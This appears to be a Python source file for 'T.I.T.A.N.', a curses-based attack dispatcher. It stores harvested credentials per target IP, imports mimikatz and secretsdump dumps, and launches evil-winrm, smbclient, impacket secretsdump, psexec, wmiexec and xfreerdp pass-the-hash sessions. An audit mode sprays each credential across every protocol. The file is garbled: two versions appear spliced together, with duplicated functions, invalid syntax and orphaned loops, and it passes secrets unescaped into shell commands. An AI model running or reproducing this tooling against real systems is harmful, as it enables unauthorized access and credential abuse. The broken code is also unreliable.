import argparse
import curses
import json
import os
import subprocess
import sys
import curses
from datetime import datetime

from datetime import datetime

from parsers import parse_credential_file

# --- CONFIGURATION ---
SCRIPT_DIR = os.path.dirname(os.path.realpath(__file__))
CONFIG_FILE = os.path.join(SCRIPT_DIR, "targets.json")
LOG_FILE = os.path.join(SCRIPT_DIR, "titan_history.log")
SCHEMA_VERSION = 2


def log_action(target, user, tool, status):
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    log_entry = f"[{timestamp}] {status.upper()} | {tool} | {target} | {user}\n"
    try:
        with open(LOG_FILE, "a") as f:
            f.write(log_entry)
    except:
        pass

def load_config():
    if not os.path.exists(CONFIG_FILE): return {}
    try:
        with open(CONFIG_FILE, "r") as f: return json.load(f)
    except: return {}
    except Exception:
        pass


def utc_timestamp():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def split_user_domain(user):
    if "\\" in user:
        domain, username = user.split("\\", 1)
        return username, domain
    return user, ""


def build_credential(target_scope, user, secret_type, secret_value, notes="", provenance=None, existing=None):
    now = utc_timestamp()
    username, domain = split_user_domain(user)
    existing = existing or {}
    provenance = provenance or {}
    existing_provenance = existing.get("provenance") if isinstance(existing.get("provenance"), dict) else {}
    existing_lifecycle = existing.get("lifecycle") if isinstance(existing.get("lifecycle"), dict) else {}
    legacy_added = existing.get("added") or existing_provenance.get("first_seen")

    return {
        "identity": {
            "username": username,
            "domain": domain,
            "target_scope": target_scope,
        },
        "secret": {
            "type": secret_type,
            "value": secret_value,
        },
        "provenance": {
            "imported_from": provenance.get("imported_from") or existing_provenance.get("imported_from") or "manual",
            "parser": provenance.get("parser") or existing_provenance.get("parser") or "manual",
            "first_seen": provenance.get("first_seen") or existing_provenance.get("first_seen") or legacy_added or now,
            "raw_evidence_snippet": provenance.get("raw_evidence_snippet") or notes or existing_provenance.get("raw_evidence_snippet") or "",
        },
        "testing": existing.get("testing") if isinstance(existing.get("testing"), dict) else {"protocols": {}},
        "lifecycle": {
            "added_at": existing_lifecycle.get("added_at") or legacy_added or now,
            "updated_at": now,
            "active": existing_lifecycle.get("active", True),
        },
        "notes": notes or existing.get("notes", ""),
        "user": user,
        "type": secret_type,
        "secret": secret_value,
        "added": legacy_added or now,
    }


def migrate_config(raw_data):
    if isinstance(raw_data, dict) and "targets" in raw_data:
        targets = raw_data.get("targets") or {}
    elif isinstance(raw_data, dict):
        targets = raw_data
    else:
        targets = {}

    migrated_targets = {}
    for target_ip, target_data in targets.items():
        target_data = target_data if isinstance(target_data, dict) else {}
        creds = target_data.get("creds") if isinstance(target_data.get("creds"), list) else []
        migrated_creds = []
        for cred in creds:
            if not isinstance(cred, dict):
                continue
            if all(k in cred for k in ["identity", "secret", "provenance", "testing", "lifecycle"]):
                user = cred.get("user")
                if not user:
                    identity = cred.get("identity") or {}
                    username = identity.get("username", "")
                    domain = identity.get("domain", "")
                    user = f"{domain}\\{username}" if domain else username
                secret_data = cred.get("secret") or {}
                cred["user"] = user
                cred["type"] = secret_data.get("type", cred.get("type", "password"))
                cred["secret"] = secret_data.get("value", cred.get("secret", ""))
                cred["notes"] = cred.get("notes") or (cred.get("provenance") or {}).get("raw_evidence_snippet", "")
                cred["added"] = cred.get("added") or (cred.get("lifecycle") or {}).get("added_at") or utc_timestamp()
                migrated_creds.append(cred)
                continue

            user = cred.get("user", "")
            secret_type = cred.get("type", "password")
            secret_value = cred.get("secret", "")
            notes = cred.get("notes", "")
            migrated_creds.append(
                build_credential(
                    target_scope=target_ip,
                    user=user,
                    secret_type=secret_type,
                    secret_value=secret_value,
                    notes=notes,
                    provenance={"imported_from": "legacy", "parser": "legacy"},
                    existing=cred,
                )
            )

        migrated_targets[target_ip] = {
            "hostname": target_data.get("hostname", "N/A"),
            "creds": migrated_creds,
        }

    return {"schema_version": SCHEMA_VERSION, "targets": migrated_targets}


def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    try:
        with open(CONFIG_FILE, "r") as f:
            raw_data = json.load(f)
    except Exception:
        raw_data = {}

    migrated = migrate_config(raw_data)
    if migrated != raw_data:
        with open(CONFIG_FILE, "w") as handle:
            json.dump(migrated, handle, indent=4)
    return migrated.get("targets", {})


def save_config(data):
    payload = {
        "schema_version": SCHEMA_VERSION,
        "targets": data,
    }
    with open(CONFIG_FILE, "w") as handle:
        json.dump(payload, handle, indent=4)


def add_unique_cred(data, ip, user, secret_type, secret_value, notes="", provenance=None):
    if any(c['user'] == user and c['secret'] == secret_value for c in data[ip]['creds']):
        return False
    data[ip]['creds'].append(
        build_credential(
            target_scope=ip,
            user=user,
            secret_type=secret_type,
            secret_value=secret_value,
            notes=notes,
            provenance=provenance,
        )
    )
    return True


def import_credentials_file(file_path, target_ip, hostname="Imported", format_hint=None):
    data = load_config()
    if target_ip not in data:
        data[target_ip] = {"hostname": hostname, "creds": []}

    parsed_records = parse_credential_file(file_path, format_hint=format_hint)
    imported_count = 0

    for record in parsed_records:
        username = record.get("username") or ""
        domain = record.get("domain") or ""
        secret_type = record.get("secret_type") or "password"
        secret_value = record.get("secret_value") or ""
        if not username or not secret_value:
            continue

        full_user = f"{domain}\\{username}" if domain and domain != "LOCAL" else username
        source_file = os.path.basename(record.get("source_file") or file_path)
        source_line = record.get("source_line")
        source_context = (record.get("source_context") or "").strip()

        notes = f"{secret_type.upper()} | {source_file}"
        if source_line:
            notes += f":{source_line}"
        if source_context:
            notes += f" | {source_context[:80]}"

        prov = {
            "imported_from": source_file,
            "parser": format_hint or "auto",
            "first_seen": utc_timestamp(),
            "raw_evidence_snippet": source_context[:200] if source_context else notes,
        }

        if add_unique_cred(data, target_ip, full_user, secret_type, secret_value, notes, provenance=prov):
            imported_count += 1

    save_config(data)
    log_action(target_ip, "IMPORT", "CredentialParser", f"IMPORTED_{imported_count}")
    return imported_count


def get_cmd(tool, target_ip, user, secret, c_type, testing=False):
    impacket_secret = f"aad3b435b51404eeaad3b435b51404ee:{secret}" if c_type == "hash" else secret
    if tool == "Evil-WinRM":
        return f"evil-winrm -i {target_ip} -u '{user}' " + (f"-H {secret}" if c_type == "hash" else f"-p '{secret}'")
    elif tool == "SMBClient":
        cmd = f"smbclient //{target_ip}/C$ -U '{user}'" + (f" --pw-nt-hash {secret}" if c_type == "hash" else f"%'{secret}'")
        return cmd + " -c 'ls'" if testing else cmd
    elif tool == "SSH":
        if c_type == "hash":
            return "echo 'SSH requires a plaintext password' >&2; exit 1"
        cmd = f"sshpass -p '{secret}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=6 '{user}'@{target_ip}"
        return cmd + " 'whoami'" if testing else cmd
    elif tool == "SecretsDump":
        return f"impacket-secretsdump '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip}"
    elif tool == "Psexec":
        cmd = f"impacket-psexec '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip}"
        return cmd + " -c 'whoami'" if testing else cmd
    elif tool == "WMIExec":
        cmd = f"impacket-wmiexec '{user}'" + (f" -hashes {impacket_secret}" if c_type == "hash" else f":'{secret}'") + f"@{target_ip}"
        return cmd + " 'whoami'" if testing else cmd
    elif tool == "XFreeRDP3":
        cmd = f"xfreerdp3 /v:{target_ip} /u:'{user}' " + (f"/pth:{secret}" if c_type == "hash" else f"/p:'{secret}'") + " /cert:ignore"
        return cmd + " +auth-only" if testing else cmd + " /dynamic-resolution"
    return ""

def test_tool(tool, target_ip, user, secret, c_type):
    fail_keywords = ["failed", "error", "denied", "not known", "invalid", "connection refused", "could not"]
    cmd = get_cmd(tool, target_ip, user, secret, c_type, testing=True)
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=12)
        output = (result.stdout + result.stderr).lower()
        if result.returncode != 0 or any(kw in output for kw in fail_keywords):
            log_action(target_ip, user, tool, "AUDIT_FAIL")
            return False
        log_action(target_ip, user, tool, "AUDIT_SUCCESS")
        return True
    except:
        return False

def draw_menu(stdscr, title, subtitle, options, current_row):
    stdscr.clear()
    h, w = stdscr.getmaxyx()
    
    # Header

def test_tool(tool, target_ip, cred):
    fail_keywords = ["failed", "error", "denied", "not known", "invalid", "connection refused", "could not"]
    cmd = get_cmd(tool, target_ip, cred['user'], cred['secret'], cred['type'], testing=True)
    now = utc_timestamp()
    status = "failed"
    summary = "No output"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=12)
        output = (result.stdout + result.stderr).lower()
        summary = (result.stdout + result.stderr).strip().replace("\n", " ")[:200] or "No output"
        if result.returncode == 0 and not any(kw in output for kw in fail_keywords):
            status = "success"
            log_action(target_ip, cred['user'], tool, "AUDIT_SUCCESS")
        else:
            log_action(target_ip, cred['user'], tool, "AUDIT_FAIL")
    except Exception as exc:
        summary = f"Execution error: {exc}"

    testing = cred.setdefault("testing", {"protocols": {}})
    protocols = testing.setdefault("protocols", {})
    protocols[tool] = {
        "last_run": now,
        "status": status,
        "output_summary": summary,
    }
    cred.setdefault("lifecycle", {}).update({"updated_at": now})
    return status == "success"


def draw_menu(stdscr, title, subtitle, options, current_row):
    stdscr.clear()
    h, _ = stdscr.getmaxyx()

    stdscr.attron(curses.color_pair(1))
    stdscr.addstr(1, 2, title, curses.A_BOLD)
    stdscr.attroff(curses.color_pair(1))
    stdscr.addstr(2, 2, subtitle)
    

    for idx, row in enumerate(options):
        x = 4
        y = 4 + idx
        if idx == current_row:
            stdscr.attron(curses.color_pair(2))
            stdscr.addstr(y, x, f" > {row} ")
            stdscr.attroff(curses.color_pair(2))
        else:
            stdscr.addstr(y, x, f"   {row}")
    
    stdscr.addstr(h-2, 2, "[Arrows] Move | [Enter] Select | [Q] Exit")
    stdscr.refresh()


    stdscr.addstr(h - 2, 2, "[Arrows] Move | [Enter] Select | [Q] Exit")
    stdscr.refresh()


def run_titan(stdscr):
    curses.curs_set(0)
    curses.init_pair(1, curses.COLOR_CYAN, curses.COLOR_BLACK)
    curses.init_pair(2, curses.COLOR_BLACK, curses.COLOR_CYAN)
    
    while True:
        data = load_config()
        if not data:
            stdscr.addstr(5, 2, "No targets in targets.json. Add via GUI.", curses.color_pair(1))
            stdscr.getch()
            return

        # --- 1. Target Selection ---
        targets = list(data.keys())
        target_opts = [f"{t.ljust(15)} ({data[t].get('hostname', 'N/A')})" for t in targets]
        current_row = 0
        
        while True:
            draw_menu(stdscr, "T.I.T.A.N. CLI v1.3", "Taylor's Interactive Tool for Attack Navigation", target_opts, current_row)
            key = stdscr.getch()
            if key == curses.KEY_UP and current_row > 0: current_row -= 1
            elif key == curses.KEY_DOWN and current_row < len(target_opts)-1: current_row += 1
            elif key == ord('q') or key == ord('Q'): sys.exit()

    while True:
        data = load_config()
        if not data:
            stdscr.addstr(5, 2, "No targets in targets.json. Add via GUI or CLI import.", curses.color_pair(1))
            stdscr.getch()
            return

        targets = list(data.keys())
        target_opts = [f"{t.ljust(15)} ({data[t].get('hostname', 'N/A')})" for t in targets]
        current_row = 0

        while True:
            draw_menu(stdscr, "T.I.T.A.N. CLI v1.3", "Taylor's Interactive Tool for Attack Navigation", target_opts, current_row)
            key = stdscr.getch()
            if key == curses.KEY_UP and current_row > 0:
                current_row -= 1
            elif key == curses.KEY_DOWN and current_row < len(target_opts) - 1:
                current_row += 1
            elif key == ord('q') or key == ord('Q'):
                sys.exit()
            elif key == curses.KEY_ENTER or key in [10, 13]:
                target_ip = targets[current_row]
                break

        # --- 2. Credential Selection ---
        creds = data[target_ip]['creds']
        cred_opts = [f"{c['user'].ljust(12)} [{c['type']}] | {c.get('notes', '')}" for c in creds]
        cred_opts.append(".. Back")
        current_row = 0
        
        while True:
            draw_menu(stdscr, f"TARGET: {target_ip}", "Select credential for dispatch:", cred_opts, current_row)
            key = stdscr.getch()
            if key == curses.KEY_UP and current_row > 0: current_row -= 1
            elif key == curses.KEY_DOWN and current_row < len(cred_opts)-1: current_row += 1
            elif key == ord('q') or key == ord('Q'): sys.exit()
            elif key == curses.KEY_ENTER or key in [10, 13]:
                if current_row == len(cred_opts) - 1: # Back
                    break
                cred = creds[current_row]
                
                # --- 3. Action Selection ---

        while True:
            draw_menu(stdscr, f"TARGET: {target_ip}", "Select credential for dispatch:", cred_opts, current_row)
            key = stdscr.getch()
            if key == curses.KEY_UP and current_row > 0:
                current_row -= 1
            elif key == curses.KEY_DOWN and current_row < len(cred_opts) - 1:
                current_row += 1
            elif key == ord('q') or key == ord('Q'):
                sys.exit()
            elif key == curses.KEY_ENTER or key in [10, 13]:
                if current_row == len(cred_opts) - 1:
                    break
                cred = creds[current_row]

                actions = ["Launch Interactive Tool", "Audit All Protocols", ".. Back"]
                act_row = 0
                while True:
                    draw_menu(stdscr, f"CRED: {cred['user']}@{target_ip}", "Choose operation:", actions, act_row)
                    key_act = stdscr.getch()
                    if key_act == curses.KEY_UP and act_row > 0: act_row -= 1
                    elif key_act == curses.KEY_DOWN and act_row < len(actions)-1: act_row += 1
                    elif key_act == ord('q') or key_act == ord('Q'): sys.exit()
                    elif key_act == curses.KEY_ENTER or key_act in [10, 13]:
                        if act_row == 0: # Launch Tool
                            tools = ["Evil-WinRM", "SMBClient", "SSH", "SecretsDump", "Psexec", "WMIExec", "XFreeRDP3"]
                    if key_act == curses.KEY_UP and act_row > 0:
                        act_row -= 1
                    elif key_act == curses.KEY_DOWN and act_row < len(actions) - 1:
                        act_row += 1
                    elif key_act == ord('q') or key_act == ord('Q'):
                        sys.exit()
                    elif key_act == curses.KEY_ENTER or key_act in [10, 13]:
                        if act_row == 0:
                            tools = ["Evil-WinRM", "SMBClient", "SecretsDump", "Psexec", "WMIExec", "XFreeRDP3"]
                            t_row = 0
                            while True:
                                draw_menu(stdscr, "DISPATCHER", "Select tool to launch:", tools, t_row)
                                key_t = stdscr.getch()
                                if key_t == curses.KEY_UP and t_row > 0: t_row -= 1
                                elif key_t == curses.KEY_DOWN and t_row < len(tools)-1: t_row += 1
                                if key_t == curses.KEY_UP and t_row > 0:
                                    t_row -= 1
                                elif key_t == curses.KEY_DOWN and t_row < len(tools) - 1:
                                    t_row += 1
                                elif key_t == curses.KEY_ENTER or key_t in [10, 13]:
                                    selected_tool = tools[t_row]
                                    cmd = get_cmd(selected_tool, target_ip, cred['user'], cred['secret'], cred['type'])
                                    log_action(target_ip, cred['user'], selected_tool, "LAUNCHED")
                                    curses.endwin() # Suspends curses to show tool output
                                    curses.endwin()
                                    print(f"\n[*] Taylor's T.I.T.A.N. Dispatching {selected_tool}...\n")
                                    subprocess.run(cmd, shell=True)
                                    input("\n[!] Session closed. Press Enter to return to T.I.T.A.N.")
                                    stdscr.clear()
                                    break
                            break # Back to Action
                        elif act_row == 1: # Audit
                            curses.endwin()
                            print(f"\n[*] Auditing all protocols for {cred['user']}...\n")
                            tools = ["Evil-WinRM", "SMBClient", "SSH", "SecretsDump", "Psexec", "WMIExec", "XFreeRDP3"]
                            for tool in tools:
                                print(f" Testing {tool.ljust(12)}: ", end="", flush=True)
                                if test_tool(tool, target_ip, cred['user'], cred['secret'], cred['type']):
                                    print("[ SUCCESS ]")
                                else: print("[ FAILED  ]")
                            input("\nPress Enter to return to T.I.T.A.N.")
                            break # Back to Action
                        elif act_row == 2: break # Back to Creds
                break # Exit Cred loop to refresh
            
if __name__ == "__main__":
    curses.wrapper(run_titan)
                            break
                        elif act_row == 1:
                            curses.endwin()
                            print(f"\n[*] Auditing all protocols for {cred['user']}...\n")
                            tools = ["Evil-WinRM", "SMBClient", "SecretsDump", "Psexec", "WMIExec", "XFreeRDP3"]
                            for tool in tools:
                                print(f" Testing {tool.ljust(12)}: ", end="", flush=True)
                                if test_tool(tool, target_ip, cred):
                                    print("[ SUCCESS ]")
                                else:
                                    print("[ FAILED  ]")
                            save_config(data)
                            input("\nPress Enter to return to T.I.T.A.N.")
                            break
                        elif act_row == 2:
                            break
                break


def build_arg_parser():
    parser = argparse.ArgumentParser(description="T.I.T.A.N. CLI")
    subparsers = parser.add_subparsers(dest="command")

    import_parser = subparsers.add_parser("import", help="Import credentials from dump files")
    import_parser.add_argument("--file", required=True, help="Path to credential dump file")
    import_parser.add_argument("--target-ip", required=True, help="Target IP to store credentials under")
    import_parser.add_argument("--hostname", default="Imported", help="Hostname label")
    import_parser.add_argument("--format", choices=["mimikatz", "secretsdump", "generic", "hash", "hashdump"], help="Optional parser hint")

    return parser


def main():
    parser = build_arg_parser()
    args = parser.parse_args()

    if args.command == "import":
        imported = import_credentials_file(
            file_path=args.file,
            target_ip=args.target_ip,
            hostname=args.hostname,
            format_hint=args.format,
        )
        print(f"Imported {imported} credentials into {args.target_ip}.")
        return

    curses.wrapper(run_titan)


if __name__ == "__main__":
    main()
